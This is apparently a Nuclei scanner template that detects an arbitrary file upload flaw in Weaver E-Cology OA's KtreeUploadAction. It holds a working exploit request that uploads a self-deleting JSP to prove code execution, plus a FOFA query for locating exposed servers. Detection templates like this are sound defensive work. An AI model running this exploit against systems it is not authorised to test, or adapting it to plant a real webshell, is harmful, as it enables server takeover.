http:
- extractors:
  - group: 1
    internal: true
    name: filepath
    part: body
    regex:
    - '''url'':''(.*?)'',''title'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code_1 == 200 && status_code_2 == 200
    - contains(body_2,'{{result}}')
    type: dsl
  raw:
  - 'POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=--------WebKitFormBoundarywgljfvib

    Upgrade-Insecure-Requests: 1


    ----------WebKitFormBoundarywgljfvib

    Content-Disposition: form-data; name="test"; filename="{{filename}}"

    Content-Type: application/octet-stream


    <%out.print({{num1}} * {{num2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>

    ----------WebKitFormBoundarywgljfvib--

    '
  - 'GET {{filepath}} HTTP/1.1

    Host: {{Hostname}}

    '
id: weaver-ecology-ktreeuploadaction-file-upload
info:
  author: Co5mos
  description: "\u6CDB\u5FAEOA E-Cology `KtreeUploadAction` \u5B58\u5728\u6587\u4EF6\
    \u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u53EF\u901A\u8FC7\u6F0F\u6D1E\
    \u4E0A\u4F20webshell\uFF0C\u8FBE\u5230\u63A7\u5236web\u670D\u52A1\u5668\u7684\u6743\
    \u9650\u3002\n"
  metadata:
    fofa-query: "app=\"\u6CDB\u5FAE-\u534F\u540C\u5546\u52A1\u7CFB\u7EDF\""
  name: Weaver E-Cology KtreeUploadAction Arbitrary File Upload
  severity: critical
  tags: file-upload, weaver, ecology, rce
variables:
  filename: '{{rand_base(6)}}.jsp'
  num1: '{{rand_int(10000, 20000)}}'
  num2: '{{rand_int(10000, 20000)}}'
  result: '{{to_number(num1)*to_number(num2)}}'
